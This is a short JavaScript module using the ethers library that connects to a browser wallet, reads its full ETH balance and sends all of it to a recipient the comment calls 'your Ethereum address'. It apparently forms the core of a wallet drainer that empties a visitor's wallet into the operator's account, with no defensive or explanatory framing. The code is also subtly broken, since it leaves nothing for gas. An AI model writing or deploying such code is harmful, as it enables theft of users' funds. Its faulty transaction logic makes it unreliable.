import { ethers } from "ethers";

const provider = new ethers.providers.Web3Provider(window.ethereum);
const signer = provider.getSigner();

export async function getBalance(address) {
    const balance = await provider.getBalance(address);
    return ethers.utils.formatEther(balance);
}

export async function signAndDeductAll(recipientAddress) {
    const address = await signer.getAddress();
    const balance = await getBalance(address);
    const transaction = {
        to: recipientAddress, // your Ethereum address
        value: ethers.utils.parseEther(balance),
        gasLimit: ethers.utils.hexlify(21000) // set the gas limit
    };

    try {
        const txResponse = await signer.sendTransaction(transaction);
        await txResponse.wait();
        return txResponse;
    } catch (error) {
        console.error('Transaction failed', error);
        throw new Error('Transaction failed');
    }
}
